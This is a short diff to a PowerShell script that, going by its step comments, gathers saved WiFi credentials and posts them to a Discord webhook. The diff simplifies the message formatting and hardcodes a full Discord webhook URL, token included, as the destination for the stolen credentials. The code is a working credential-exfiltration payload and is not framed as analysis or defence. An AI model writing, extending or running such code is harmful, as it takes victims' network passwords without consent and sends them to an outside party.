@@ -17,11 +17,12 @@ try {
 
     # Step 4: Prepare the JSON payload for Discord
     $body = @{
-        content = "WiFi Credentials:`n````$wifiCreds````"
+        content = "WiFi Credentials:`n$wifiCreds"
     } | ConvertTo-Json -Depth 10
 
     # Step 5: Send the WiFi credentials to the Discord webhook
-    Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $body -ContentType 'application/json'
+    Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1299731417290375279/pfX2RVqzHPbZDbdw97pCiSZ9keXRQlRyEul7Wbisgvjw9pbbpLEyr_ZAIXTEQ-VUhbUP" `
+                       -Method POST -Body $body -ContentType 'application/json'
 
 } catch {
     # Step 6: Handle any errors and log them
